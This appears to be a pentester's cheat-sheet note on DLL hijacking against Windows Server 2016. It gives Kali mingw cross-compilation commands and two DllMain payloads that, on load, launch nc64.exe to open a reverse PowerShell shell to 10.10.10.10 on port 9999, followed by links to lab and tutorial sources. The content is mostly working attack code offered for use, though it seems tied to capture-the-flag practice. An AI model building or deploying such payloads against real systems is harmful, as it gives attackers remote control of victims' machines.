## DLL hijacking, Compiling dll on Kali, target x64 Win Server 2016

------
`x86_64-w64-mingw32-gcc payload.c -shared -o payload.dll`
`x86_64-w64-mingw32-g++ payload.c -lws2_32 -shared -o payload.dll `
`sudo apt-get install mingw-w64`
<pre><code>#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		WinExec("c:\\windows\\system32\\spool\\drivers\\color\\nc64.exe 10.10.10.10 9999 -e powershell.exe", 0);
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}
</code></pre>

<pre><code>
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	system("c:\\windows\\system32\\spool\\drivers\\color\\nc64.exe 10.10.10.10 9999 -e powershell.exe");
	ExitProcess(0);
	return TRUE;
}
</code></pre>
ref:
[IPPSEC arkham vid](https://youtu.be/krC5j1Ab44I?t=3937) </br>
[null-byte](https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/)</br>
[hacking-tutorial](https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/)</br>